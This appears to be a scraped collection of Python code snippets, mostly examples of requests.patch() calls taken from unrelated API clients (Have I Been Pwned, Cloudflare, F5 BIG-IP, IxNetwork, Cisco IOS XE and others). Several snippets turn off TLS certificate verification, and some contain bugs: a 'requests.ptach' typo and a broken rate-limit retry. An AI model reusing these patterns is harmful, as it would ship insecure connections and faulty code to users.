                    formatted_hostname = self.bot.format(hostname, color=self.bot.color.GREEN)
                    if title is not None and mimetype is not None:
                        formatted_title = self.bot.format(title, bold=True)
                        reply = f'[ {formatted_hostname} ] {formatted_title} ({mimetype})'

                        if size and mimetype not in HTML_MIMETYPES:
                            reply += f' ({size_fmt(size)})'

                        messages.append(reply)

            # Send all parsed URLs now that we have them all.
            if messages:
                pipe_character = self.bot.format(' | ', color=self.bot.color.LIGHT_GRAY, reset=True)
                self.bot.privmsg(target, pipe_character.join(messages)) 
**************************************
def get_request(self, url: str, key: str, params=None, max_attempts=2) -> list:
        """
        :param url: specifies which haveibeenpwned api call is used
        :param params: used to filter searches
        :param max_attempts: how many times the plugin will retry if it receives a 429 error
        :return: A boolean value 'found' for results and the results if found is True
        """
        self._HEADERS["hibp-api-key"] = key
        try:
            response = requests.get(url=url, headers=self._HEADERS, params=params)
        except requests.RequestException as e:
            self.logger.error(e)
            raise
        if response.status_code == 200:  # 200 Results found
            response_json = response.json()
            time.sleep(2)
            return response_json
        elif response.status_code == 404:  # 404 Results were not found
            time.sleep(2)
            return []
        elif response.status_code == 429:  # too many requests from your IP
            if 'Retry-After' in response.headers:
                retry = response.headers['Retry-After']
                # HIBP recommendation on adding an additional 100 millisecond delay between requests
                self.logger.info('Too many requests. The rate limit has been exceeded.'
                                 ' Will retry after back off of: {0} sec'.format(retry))
                time.sleep(retry + .100)
                return self.get_request(url, params, max_attempts=0)  # Retry get_request
            else:
                # Just in case we don't get a Retry-After in the header
                if max_attempts > 0:
                    range_increase = 2 ** self._retries
                    self._retries = self._retries + 1
                    # set random time to wait
                    back_off = random.randrange(3, 5 + range_increase)  # nosec
                    self.logger.info('Too many requests. The rate limit has been exceeded.'
                                     ' Will retry after back off of: {0} sec'.format(back_off))
                    time.sleep(back_off)  # Wait to slow down request rate
                    return self.get_request(url, params, max_attempts=max_attempts - 1)  # Retry get_request
            raise Exception('Too many requests. The rate limit has been exceeded. Back off has failed.'
                            ' Please run fewer workflows with the Have I been Pwned plugin')
        elif response.status_code == 503:  # DDOS protection has flagged your IP for possible abuse
            raise Exception('Warning: HTTP 503 status code received.'
                            ' Have I Been Pwned has flagged this IP address as possibly abusive,'
                            ' and issued a 24-hour ban. Please discontinue use of the plugin for 24 hours'
                            ' and try again. If the issue persists, contact support.')
        else:
            self.logger.error('An unknown error occurred status code: {0}'.format(response.status_code))
            raise Exception('{0} error'.format(response.status_code)) 
**************************************
def __init__(self, config, db, user_name, password, sync_dir):
        self.db = db
        self.config = config
        self.sync_dir = sync_dir

        self.http = requests.session()

        try:
            r = self.http.get(self.studip_url("/studip/index.php?again=yes&sso=shib"))
        except RequestException as e:
            raise_fetch_error("login page", e)

        try:
            form_data = parse_login_form(r.text)
        except ParserError:
            raise LoginError("Error parsing login page")

        try:
            r = self.http.post(
                    self.sso_url(form_data.post_url),
                    data = {
                        "j_username": user_name,
                        "j_password": password,
                        "uApprove.consent-revocation": "",
                        "_eventId_proceed": ""
                    }
                )
        except RequestException as e:
            raise_fetch_error("login confirmation page", e)

        try:
            form_data = parse_saml_form(r.text)
        except ParserError as e:
            message = "Login failed"
            if e.message:
                message += ": " + e.message
            raise LoginError(message)

        try:
            r = self.http.post(self.studip_url("/Shibboleth.sso/SAML2/POST"), form_data)
        except RequestException as e:
            raise_fetch_error("login page", e) 

Python requests.patch() Examples

**************************************
def _send_raw_http_request(self, method, url, data=None):
        self.__logger.debug('%s %s' % (method, url))
        if method in ['POST', 'PUT', 'PATCH']:
            self.__logger.log(TINTRI_LOG_LEVEL_DATA, 'Data: %s' % data)

        headers = {'content-type': 'application/json'}
        if self.__session_id:
            headers['cookie'] = 'JSESSIONID=%s' % self.__session_id

        if method in ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']:
            if method == 'GET': httpresp = requests.get(url, headers=headers, verify=False)
            elif method == 'POST': httpresp = requests.post(url, data, headers=headers, verify=False)
            elif method == 'PUT': httpresp = requests.put(url, data, headers=headers, verify=False)
            elif method == 'PATCH': httpresp = requests.patch(url, data, headers=headers, verify=False)
            elif method == 'DELETE': httpresp = requests.delete(url, headers=headers, verify=False)
            self._httpresp = httpresp # self._httpresp is for debugging only, not thread-safe
            return httpresp
        else:
            raise TintriError(None, message='Invalid HTTP method: ' + method) # This should never happen 
**************************************
def run(self):
        try:
            self.sse = ClosableSSEClient(self.url)
            for msg in self.sse:
                event = msg.event
                if event is not None and event in ('put', 'patch'):
                    response = json.loads(msg.data)
                    if response is not None:
                        # Default to CHILD_CHANGED event
                        occurred_event = FirebaseEvents.CHILD_CHANGED
                        if response['data'] is None:
                            occurred_event = FirebaseEvents.CHILD_DELETED

                        # Get the event I'm trying to listen to
                        ev = FirebaseEvents.id(self.event_name)
                        if occurred_event == ev or ev == FirebaseEvents.CHILD_CHANGED:
                            self.callback(event, response)
        except socket.error:
            pass 
**************************************
def import_project(project, opts):
    u = opts.scheme + '://' + opts.host + _api + opts.project_id
    r = requests.patch(
            url=u,
            auth=HTTPBasicAuth(opts.username, opts.password),
            data=json.dumps(project),
            headers={'Content-Type': 'application/json'},
            verify=not (opts.insecure_skip_verify and opts.insecure_skip_verify))

    rjson = r.json()
    ret = dict(lair_response)
    ret['status'] = rjson['Status']
    ret['message'] = rjson['Message']

    return ret

# Function that performs project export. Returns a json string 
**************************************
def _update_category(self, signal_id, new_category_slug):
        endpoint = '{url}/v1/private/signals/{signal_id}'.format(url=self.url, signal_id=signal_id)
        data = json.dumps({
            'category': {
                'sub_category': new_category_slug,
                'text': MESSAGE,
            }
        })

        r = requests.patch(endpoint, data=data, headers=self.headers)
        if r.status_code == 200:
            print('Updated category for Signal #{}'.format(signal_id))
            self.success += 1
        else:
            print('Failed to update the category for Signal #{}'.format(signal_id))
            self.errors.append(signal_id) 
**************************************
def update_status(self, signal_id, new_state, message, acceptable_states=None):
        if acceptable_states is None:
            acceptable_states = []
        acceptable_states.append(new_state)  # if we are in desired state, skip

        # check status
        current_status = self._check_status(signal_id)
        if current_status['state'] in acceptable_states:
            print('Already in desired state.')
            return  # already in desired state

        # mutate signal status
        print('mutate')
        payload = copy.deepcopy(UPDATE_STATUS)
        payload['status']['state'] = new_state
        payload['status']['text'] = message

        response = requests.patch(
            DETAIL_ENDPOINT.format(base_url=self.base_url, signal_id=signal_id),
            json=payload,
            headers=self.headers,
        )
        response.raise_for_status()
        self._check_status(signal_id)
        print('') 
**************************************
def update_status(self, signal_id, new_state, message, acceptable_states=None):
        if acceptable_states is None:
            acceptable_states = []
        acceptable_states.append(new_state)  # if we are in desired state, skip

        # check status
        current_status = self._check_status(signal_id)
        if current_status['state'] in acceptable_states:
            print('Already in desired state.')
            return  # already in desired state

        # mutate signal status
        print('mutate')
        payload = copy.deepcopy(UPDATE_STATUS)
        payload['status']['state'] = new_state
        payload['status']['text'] = message

        response = requests.patch(
            DETAIL_ENDPOINT.format(base_url=self.base_url, signal_id=signal_id),
            json=payload,
            headers=self.headers,
        )
        response.raise_for_status()
        self._check_status(signal_id) 
**************************************
def update_category(self, signal_id, category_url, message):
        """
        Move given signal to category with descriptive message in logs.
        """
        category_data = self._check_category(signal_id)
        current_cat_url = urlparse(category_data['category_url']).path
        if current_cat_url == category_url:
            return

        payload = copy.deepcopy(UPDATE_CATEGORY)
        payload['category']['sub_category'] = category_url
        payload['category']['text'] = message
        print('mutate')
        response = requests.patch(
            DETAIL_ENDPOINT.format(base_url=self.base_url, signal_id=signal_id),
            json=payload,
            headers=self.headers,
        )
        response.raise_for_status()
        self._check_category(signal_id) 
**************************************
def api_call_patch(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.patch(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def patch(self, url, data):
        """PATCH method for amp."""
        try:
            response = requests.patch(
                "https://{}{}".format(self.endpoint, url),
                data=json.dumps(data),
                auth=(self.client_id, self.key),
                headers=self.headers
            )
            # Consider any status other than 2xx an error
            if not response.status_code // 100 == 2:
                return "Error: Unexpected response {}".format(response)
            try:
                return response.json()
            except:
                return "Error: Non JSON response {}".format(response.text)
        except requests.exceptions.RequestException as e:
            # A serious problem happened, like an SSLError or InvalidURL
            return "Error: {}".format(e) 
**************************************
def patch(self, url, data):
        """PATCH method for amp."""
        try:
            response = requests.patch(
                "https://{}{}".format(self.endpoint, url),
                data=json.dumps(data),
                auth=(self.client_id, self.key),
                headers=self.headers
            )
            # Consider any status other than 2xx an error
            if not response.status_code // 100 == 2:
                return "Error: Unexpected response {}".format(response)
            try:
                return response.json()
            except:
                return "Error: Non JSON response {}".format(response.text)
        except requests.exceptions.RequestException as e:
            # A serious problem happened, like an SSLError or InvalidURL
            return "Error: {}".format(e) 
**************************************
def patch(self, rest_query, data=None):
        """
        Sends a PATCH request to the Alyx server.
        For the dictionary contents, refer to:
        https://alyx.internationalbrainlab.org/docs

        :param rest_query: (required)the endpoint as full or relative URL
        :type rest_query: str
        :param data: json encoded string or dictionary
        :type data: None, dict or str

        :return: response object
        """
        if isinstance(data, dict):
            data = json.dumps(data)
        return self._generic_request(requests.patch, rest_query, data=data) 
**************************************
def __init__(self, username, password, org, repo, base_url=None):
        self.username = username
        self.password = password
        self.org = org
        self.repo = repo

        base_url = base_url or "https://api.github.com"
        self.base_url = "{}/repos/{}/{}".format(base_url, org, repo)

        # Endpoints
        self.diff_media_type = "application/vnd.github.3.diff"
        self.patch_media_type = "application/vnd.github.3.patch"
        self.contents_url = "{}/contents".format(self.base_url)
        self.merge_url = "{}/merges".format(self.base_url)
        self.compare_url = "{}/compare".format(self.base_url)
        self.trees_url = "{}/git/trees".format(self.base_url)
        self.refs_url = "{}/git/refs".format(self.base_url)
        self.blobs_url = "{}/git/blobs".format(self.base_url)
        self.commits_url = "{}/git/commits".format(self.base_url)
        self.repo_commits_url = "{}/commits".format(self.base_url) 
**************************************
def __update_property(self, base_url, sas_token, api_version, prop_name, prop_id, properties):
        prop_res = requests.patch(base_url + 'properties/' + prop_id + api_version,
                                  headers = {'Authorization': sas_token, 'If-Match': '*'},
                                  json = {
                                      'name': prop_name,
                                      'value': properties['value'],
                                      'tags': properties['tags'],
                                      'secret': properties['secret']    
                                  })
        if (200 != prop_res.status_code
            and 204 != prop_res.status_code):
            print "Update of property '" + prop_name + "' failed."
            print prop_res.text
            return False
        print "Successfully updated property '" + prop_name + "' (id " + prop_id + ")."
        return True 
**************************************
def get_scm_sas_token(self, instance):
        rest_token = self.get_sas_token(instance)
        
        git_access = requests.get(self.get_base_url(instance) + 'tenant/access/git' + self.get_api_version(), 
            headers = {'Authorization': rest_token})
        
        if (requests.codes.ok != git_access.status_code):
            return git_access.text
        
        git_data = byteify(json.loads(git_access.text))
        
        if not git_data['enabled']:
            print "Enabling git repository..."
            enable_res = requests.patch(self.get_base_url(instance) + 'tenant/access/git' + self.get_api_version(),
                                        headers = {'Authorization': rest_token},
                                        json = {'enabled': True})
            if (204 != enable_res.status_code):
                print "Failed to enable git access!"
                return False
            return self.get_scm_sas_token(instance)

        return urllib.quote_plus(self.get_sas_token_internal(git_data['id'], git_data['primaryKey'])) 
**************************************
def run(self, params={}):
        user_principal_name = params.get(Input.USER_PRINCIPAL_NAME)
        location = params.get(Input.LOCATION)
        token = self.connection.access_token

        base_url = "https://graph.microsoft.com/v1.0/users/%s" % user_principal_name
        headers = {"Authorization": "Bearer %s" % token, "Content-Type": "application/json",}
        
        body = {
            "usageLocation": location
        }
        
        try:
            response = requests.patch(base_url, json=body, headers=headers)
        except requests.HTTPError:
            raise PluginException(cause=f"There was an issue updating the user's location. Double-check the user name: {user_principal_name}",
                        data=response.text)
        if response.status_code == 204:
            return {Output.SUCCESS: True}
        else:
            raise PluginException(f"The response from Office365 indicated something went wrong: {response.status_code}",
                              data=response.text) 
**************************************
def _upload_chunk(self, data, offset, file_endpoint, headers=None, auth=None):
        floyd_logger.debug("Uploading %s bytes chunk from offset: %s", len(data), offset)

        h = {
            'Content-Type': 'application/offset+octet-stream',
            'Upload-Offset': str(offset),
            'Tus-Resumable': self.TUS_VERSION,
        }

        if headers:
            h.update(headers)

        response = requests.patch(file_endpoint, headers=h, data=data, auth=auth)
        self.check_response_status(response)

        return int(response.headers["Upload-Offset"]) 
**************************************
def _patch(self, url, data_dict, params):
        rdata = json.dumps(data_dict)

        response = requests.patch(url, data=rdata, params=params,
                                  headers=self._headers)
        data = json.loads(response.content.decode())

        if response.status_code == 200:
            return data

        self.last_error = {
            "status_code": response.status_code,
            "detail": response.content
        }
        print(self.last_error)
        return None 
**************************************
def patch(self, restApi, data={}, silentMode=False):
        """
        Description
           A HTTP PATCH function to modify configurations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
        """

        if silentMode == False:
            print('\nPATCH:', restApi)
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)
        try:
            response = requests.patch(restApi, data=json.dumps(data), headers=self.jsonHeader)
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                print('\nPatch error:')
                raise IxNetRestApiException('http PATCH error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http PATCH error: {0}\n'.format(errMsg)) 
**************************************
def configLicenseServerDetails(self, licenseServer=None, licenseMode=None, licenseTier=None):
        """
        Description
           Configure license server details: license server IP, license mode and license tier.

        Parameter
            licenseServer: License server IP address(s) in a list.
            licenseMode: subscription|perpetual}mixed
            licenseTier: tier1, tier2, tier3 ...

        Syntax
           PATCH: https://{apiServerIp}/api/v1/sessions/{id}/ixnetwork/globals/licensing
        """
        # Each new session requires configuring the new session's license details.
        data = {}
        if licenseServer:
            data.update({'licensingServers': licenseServer})
        if licenseMode:
            data.update({'mode': licenseMode})
        if licenseTier:
            data.update({'tier': licenseTier})

        response = self.patch(self.sessionUrl+'/globals/licensing', data=data)
        self.showLicenseDetails() 
**************************************
def configMultivalue(self, multivalueUrl, multivalueType, data):
        """
        Description
            Configure multivalues.

        Parameters
            multivalueUrl: The multivalue href. Ex: /api/v1/sessions/1/ixnetwork/multivalue/1
            multivalueType: counter|singleValue|valueList
            data = In Python Dict format. Ex:
                   If singleValue, data={'value': '1.1.1.1'})
                   If valueList,   data needs to be in a [list]:  data={'values': [list]}
                   If counter,     data={'start': value, 'direction': increment|decrement, 'step': value}
        """
        if multivalueType == 'counter':
            # Example: macAddress = {'start': '00:01:01:00:00:01', 'direction': 'increment', 'step': '00:00:00:00:00:01'}
            #          data=macAddress)
            self.patch(self.httpHeader+multivalueUrl+'/counter', data=data)

        if multivalueType == 'singleValue':
            # data={'value': value}
            self.patch(self.httpHeader+multivalueUrl+'/singleValue', data=data)

        if multivalueType == 'valueList':
            # data={'values': ['item1', 'item2']}
            self.patch(self.httpHeader+multivalueUrl+'/valueList', data=data) 
**************************************
def patch(self, restApi, data={}, silentMode=False):
        """
        Description
           A HTTP PATCH function to modify configurations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
        """

        if silentMode == False:
            print('\nPATCH:', restApi)
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)
        try:
            response = requests.patch(restApi, data=json.dumps(data), headers=self.jsonHeader)
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                print('\nPatch error:')
                raise IxNetRestApiException('http PATCH error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http PATCH error: {0}\n'.format(errMsg)) 
**************************************
def patch(self, restApi, data={}, silentMode=False):
        """
        Description
           A HTTP PATCH function to modify configurations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
        """

        if silentMode == False:
            print('\nPATCH:', restApi)
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)
        try:
            response = requests.patch(restApi, data=json.dumps(data), headers=self.jsonHeader)
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                print('\nPatch error:')
                raise IxNetRestApiException('http PATCH error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http PATCH error: {0}\n'.format(errMsg)) 
**************************************
def patch(self, restApi, data={}, silentMode=False):
        """
        Description
           A HTTP PATCH function to modify configurations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
        """

        if silentMode == False:
            print('\nPATCH:', restApi)
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)
        try:
            response = requests.patch(restApi, data=json.dumps(data), headers=self.jsonHeader)
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                print('\nPatch error:')
                raise IxNetRestApiException('http PATCH error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http PATCH error: {0}\n'.format(errMsg)) 
**************************************
def main(args):
    if not os.path.isfile(args.yaml_path):
        raise FileNotFoundError(f'{args.yaml_path} does not exist')

    command = 'delete' if args.delete else 'apply'
    print(f'{command} {args.yaml_path} to {args.endpoint}')
    with open(args.yaml_path) as f:
        data = json.dumps(yaml.load(f))

    path = '/orion/v2/entities/' + args.entity_id + '/attrs?type=' + args.entity_type
    url = urllib.parse.urljoin(args.endpoint, path)
    headers = {
        'Content-Type': 'application/json',
        'Authorization': f'bearer {args.token}',
        'Fiware-Service': args.fiware_service,
        'Fiware-Servicepath': args.fiware_servicepath,
    }

    payload = {
        command: {
            'value': urllib.parse.quote(data)
        }
    }
    response = requests.patch(url, json=payload, headers=headers)
    print(f'status_code={response.status_code}, body={response.text}\n') 
**************************************
def update(self, request, *args, **kwargs):
        """Update a Source."""
        if request.method == 'PUT':
            raise SourcesMethodException('PUT not supported')

        source_id = kwargs.get('source_id')
        url = f'{self.url}{source_id}/'
        try:
            r = requests.patch(url, json=request.data, headers=self.request.headers)
        except requests.exceptions.ConnectionError as error:
            raise SourcesProxyException(str(error))
        response = HttpResponse(
            content=r.content,
            status=r.status_code,
            content_type=r.headers['Content-Type']
        )

        return response 
**************************************
def set_source_status(self, error_msg, cost_management_type_id=None):
        """Set the source status with error message."""
        if not cost_management_type_id:
            cost_management_type_id = self.get_cost_management_application_type_id()

        application_query_url = '{}/applications?filter[application_type_id]={}&filter[source_id]={}'.\
            format(self._base_url, cost_management_type_id, str(self._source_id))
        application_query_response = requests.get(application_query_url, headers=self._identity_header)
        response_data = application_query_response.json().get('data')
        if response_data:
            application_id = response_data[0].get('id')

            application_url = f'{self._base_url}/applications/{str(application_id)}'
            if error_msg:
                status = 'unavailable'
            else:
                status = 'available'
                error_msg = ''
            json_data = {'availability_status': status, 'availability_status_error': str(error_msg)}
            application_response = requests.patch(application_url, json=json_data, headers=self._identity_header)
            if application_response.status_code != 204:
                raise SourcesHTTPClientError(f'Unable to set status for Source: {self._source_id}')
            return True
        return False 
**************************************
def patch(self, method, uri, query_param, request_param, headers, **kwargs):
        """
        TODO: Implementation.

        :param method:
        :param uri:
        :param query_param:
        :param request_param:
        :param headers:
        :param kwargs:
        :return:
        """
        _url = self.base_url + uri + "?" + urlencode(query_param)
        if headers is not None:
            resp = requests.ptach(_url, data=request_param, headers=headers, **kwargs)
        else:
            resp = requests.patch(_url, data=request_param, **kwargs)

        if resp.status_code == 200:
            return resp

        raise BacklogError("Http response {status}: {message}".format(status=resp.status_code, message=resp.text)) 
**************************************
def define_policy_as_default(policy_uuid,service_uuid):
    """Define a Runtime Policy as default.

    :param policy_uuid: uuid of a policy descriptor.

    :returns: A tuple. [0] is a bool with the result. [1] is a string containing
        the uuid of the terminated policy descriptor.
    """

    url = env.policy_api + '/default/' + policy_uuid

    data = {'nsid': service_uuid, 'defaultPolicy': True}
    resp = requests.patch(url,
                          json=data,
                          timeout=env.timeout)
  
    if resp.status_code != 200:
        LOG.debug("Request returned with " + (str(resp.status_code)))
        error = resp.text
        return False, error

    message = json.loads(resp.text)['message']

    return True, message 
**************************************
def attach_policy(policy_uuid, service_uuid, sla_uuid):
    """Attaches a policy to a service and SLA.

    :param policy_uuid: uuid of a policy descriptor.
    :param service_uuid: uuid of a network service.
    :param sla_uuid: uuid of an SLA.

    :returns: A tuple. [0] is a bool with the result. [1] is a string indicating
        the result.
    """

    data = {'nsid': service_uuid, 'slaid': sla_uuid}
    resp = requests.patch(env.policy_bind_api + '/' + policy_uuid,
                          json=data,
                          timeout=env.timeout)
  
    if resp.status_code != 200:
        LOG.debug("Request returned with " + (str(resp.status_code)))
        error = resp.text
        return False, error

    message = json.loads(resp.text)['message']

    return True, message 
**************************************
def genericPATCH(self, body):
        """
           PATCH to edit an existing configuration object with a JSON body.
           Need to formulate the URL with the name as part of the URL and NAME must not be in the body
        """
        URI = "%s%s%s" % (BIG_IP.TRANSPORT, self.BIG_IP_host, self.uri)
        try:
            if self.token is None:
                r = requests.patch(URI, auth=(self.username, self.password), data=body, headers=BIG_IP.HEADER, verify=False)
            else:
                r = requests.patch(URI, data=body, headers=BIG_IP.HEADER, verify=False)
        except requests.ConnectionError as e:
            self.status_code = 599
            self.response = str(e)
            return None
        self.status_code = r.status_code
        try:
            self.response = r.json()
        except ValueError:
            self.response = None

        if r.status_code == 200:
            self.changed = True
            return True
        return False 
**************************************
def patch(self, *args, **kwargs):
        kwargs['method'] = 'patch'
        return self.do(*args, **kwargs) 
**************************************
def update(self, payload):
        return requests.patch(self.current_url, json=payload) 
**************************************
def rest_api_patch(self, rest_url, body, api_version):
        """
        PATCH request to the REST API - Not tested
        :return: JSON string of the PATCH response
        """
        response = requests.patch(
            "{org_instance}/services/data/v{api_version}/{rest_url}".format(
                org_instance=self.instance, api_version=api_version, rest_url=rest_url
            ),
            data=body,
            headers=self.sf_headers
        )

        return response 
**************************************
def _tag_release(new_version, current_version, milestone, release_name, token):
    global GIT_COMMANDS
    global RELEASE_NOTE_UPDATE_URL
    for command_name in ["create_new_tag", "push_tag"]:
        command = GIT_COMMANDS.get(command_name)
        command[0] = command[0].format(
            new_version=new_version, current_version=current_version
        )
        out, error, ret = _run_shell_command(command=command)
        if int(ret) != 0:
            print("Failed to execute the command: {}".format(command[0]))
            exit(1)

    change_log = _generate_markdown_document(
        milestone, release_name, current_version, new_version
    )

    body = {"name": release_name or new_version, "body": change_log}

    headers = {"content-type": "application/json"}

    response = patch(
        RELEASE_NOTE_UPDATE_URL.format(new_version=new_version, token=token),
        data=dumps(body),
        headers=headers,
    )
    response.raise_for_status() 
**************************************
def _patch(self, request, data, headers=None):
        url = '{0}{1}'.format(self._url(), request)
        headers = self.headers if headers is None else headers
        response = requests.patch(url, data=json.dumps(data), headers=headers, verify=self.verify_cert,
                                  timeout=self.timeout)
        return self._validate(response) 
**************************************
def precord(payload):
    # r = requests.patch(uri, data=json.dumps(payload), headers=headers)
    # For bypassing self-signed verification
    r = requests.patch(zone_uri, data=json.dumps(payload), headers=headers, verify=False)
    print(r.text) 
**************************************
def exec_pdns_api(self, action, url, json_data=None, text=False):

        # remove double: //
        url = url.replace(r'//', '/')
        # remove extra ^/
        if url[0] == '/':
            url = url[1:]

        call_url = self.url_base + '/' + url

        headers = {'X-API-Key': self.key} 

        if action == 'GET':
            r = requests.get(call_url, headers=headers)
        elif action == 'POST':
            r = requests.post(call_url, data=json_data, headers=headers)
        elif action == 'PATCH':
            r = requests.patch(call_url, data=json_data, headers=headers)
        elif action == 'DELETE':
            r = requests.delete(call_url, headers=headers)
        else:
            raise ValueError('action unknown: %s' % action)

        if r.ok:
            if action == 'GET':
                if text:
                    return r.text
                else:
                    return r.json()
            else:
                return r
        else:
            raise ValueError('url returned an error: %s:\n%s\n---\n%s' % (call_url, r.headers, r.text)) 
**************************************
def _send_request(method, url, params, data, **settings):
        if method == TestMethod.GET:
            return requests.get(url=url, params=params, **settings)
        elif method == TestMethod.PUT:
            return requests.put(url=url, data=data, **settings)
        elif method == TestMethod.POST:
            return requests.post(url=url, data=data, **settings)
        elif method == TestMethod.PATCH:
            return requests.patch(url=url, data=data, **settings)
        elif method == TestMethod.DELETE:
            return requests.delete(url=url, **settings)
        else:
            raise UnsupportedMethodError('Unsupported method: %s' % method) 
**************************************
def update_deck(self, deck, user_id):
        """Update an existing deck.

        Args:
            deck (Deck): The Deck object to update.

        Returns:
            Deck: The updated Deck object if update was successful.

        """
        # Clone headers to not modify the global variable.
        headers = dict(DEFAULT_HEADERS)
        if deck.cover:
            # A new cover has been set on the deck, send the PATCH request as a
            # multipart-form:
            request_payload = json_converter.deck_to_json(deck)
            request_payload = to_multipart_form(request_payload)
            headers['Content-Type'] = request_payload.content_type
        else:
            # Otherwise, send the PATCH request as JSON:
            request_payload = json_converter.deck_to_json(deck,
                                                          as_json_str=True)
            request_payload = json.dumps(request_payload)
            headers['Content-Type'] = 'application/json'

        r = requests.patch(url=API_URL + 'decks/' + deck.id,
                           data=request_payload, headers=headers,
                           cookies={'jwt_token': self.jwt})

        if not r.ok:
            raise Exception('Failure while sending updates to server: %s'
                            % r.text)

        # The response from the PATCH request does not contain cards.
        # Therefore, we have to query the updated deck with an extra request.
        updated_deck = self.get_deck(deck.id, user_id)

        return updated_deck 
**************************************
def _execute_call(self, url, method='get', data=None):
        try:
            self.logger.info('Calling {}'.format(url))
            requests.packages.urllib3.disable_warnings()
            url_base = 'https://{0}:{1}/restconf/data/'.format(self.host, self.port)
            headers = {
            'Accept': 'application/yang-data+json',
            'content-type': 'application/yang-data+json'
            }
            if method == 'get':
                response = requests.get(url_base+url, auth=(self.username, self.password), headers=headers, verify=False)
            elif method == 'patch':
                response = requests.patch(url_base+url, auth=(self.username, self.password), headers=headers, verify=False, data=json.dumps(data, ensure_ascii=False))
            elif method == 'delete':
                response = requests.delete(url_base+url, auth=(self.username, self.password), headers=headers, verify=False, data=json.dumps(data, ensure_ascii=False))

            result = Result(response=response)
            result.status_code = response.status_code

            if response.status_code in HTTP_ERROR_CODES:
                result.ok = False
                result.error = HTTP_ERROR_CODES[response.status_code]

            elif response.status_code in HTTP_SERVER_ERRORS:
                result.ok = False
                result.error = HTTP_SERVER_ERRORS[response.status_code]

            elif response.status_code in HTTP_SUCCESS_CODES:
                result.ok = True
                result.message = HTTP_SUCCESS_CODES[response.status_code]

            if not response.status_code == 204:
                result.json = response.json()

            return result

                #response = requests.get(url, auth=(USER, PASS), headers=headers, verify=False)
        except Exception as e:
            self.logger.error(e) 
**************************************
def add_access_group(self, interface):
        """Function to create a IP accessgroup on IOS XE"""
        parsed_interface =re.search(r"(?P<intrfname>[A-Za-z]+)(?P<intf_num>\d((/\d+)+(\.\d+)?)|\d)",interface).groupdict()
        interface_name = parsed_interface.get('intrfname')
        interface_number = parsed_interface.get('intf_num')
        api_interface = '{0}={1}'.format(interface_name, interface_number)
        url = 'https://{0}:{1}/data/Cisco-IOS-XE-native:native/interface/{2}'.format(self.host, self.port, api_interface)
        headers = {
        'Accept': 'application/yang-data+json',
        'content-type': 'application/yang-data+json'
        }

        data = {
        "Cisco-IOS-XE-native:GigabitEthernet":[
              {
                 "name":interface_number,
                 "ip":{
                    "access-group":{
                       "in":{
                          "acl":{
                             "acl-name":"DROP",
                             "in":[None]
                          }
                       }
                    }
                 }
              }
           ]
        }

        response = self._execute_call('Cisco-IOS-XE-native:native/interface/{0}'.format(api_interface), method='patch', data=data)
        return response 
**************************************
def _patch(self, url, json=None, **kwargs):
        return self._request_submit(requests.patch, url=url, json=json, **kwargs) 
**************************************
def patch(self, path):
        """
        Makes a RESTful PATCH request to the back end.
        :param path: URL of the request (without root URL e.g. "/data")
        :return: response: Response
        """
        auth_header = self.get_header()
        auth = self.get_auth()
        return requests.patch(self._url+path, headers=auth_header, auth=auth, timeout=5) 
**************************************
def patch(url,data):
	try:
	    response = requests.patch(url, data)
	    # Consider any status other than 2xx an error
	    if not response.status_code // 100 == 2:
	        return "Error: Unexpected response {}".format(response)
	    try:
	        return response.json()
	    except:
	        return "Error: Non JSON response {}".format(response.text)
	except requests.exceptions.RequestException as e:
	    # A serious problem happened, like an SSLError or InvalidURL
	    return "Error: {}".format(e) 
**************************************
def patch(url, headers, data):
    try:
        response = requests.patch(url, json.dumps(data), headers=headers, verify=True)
        # Consider any status other than 2xx an error
        if not response.status_code // 100 == 2:
            return "Error: Unexpected response {}".format(response)
        try:
            return response.json()
        except:
            return "Error: Non JSON response {}".format(response.text)
    except requests.exceptions.RequestException as e:
        # A serious problem happened, like an SSLError or InvalidURL
        return "Error: {}".format(e) 
**************************************
def amppatch(url, headers, data):
	try:
		response = requests.patch(url, json.dumps(data), headers=headers, verify=True)
		# Consider any status other than 2xx an error
		if not response.status_code // 100 == 2:
			return "Error: Unexpected response {}".format(response)
		try:
			return response.json()
		except:
			return "Error: Non JSON response {}".format(response.text)
	except requests.exceptions.RequestException as e:
		# A serious problem happened, like an SSLError or InvalidURL
		return "Error: {}".format(e) 
**************************************
def address_update(self, ip, hostname=None, description=None, is_gateway=None, mac=None):
        """Update address informations"""
        orgdata = self.address_search(ip)[0]
        data = {}
        if hostname != None: data["hostname"] = hostname
        if description != None: data["description"] = description
        if is_gateway != None: data["is_gateway"] = is_gateway
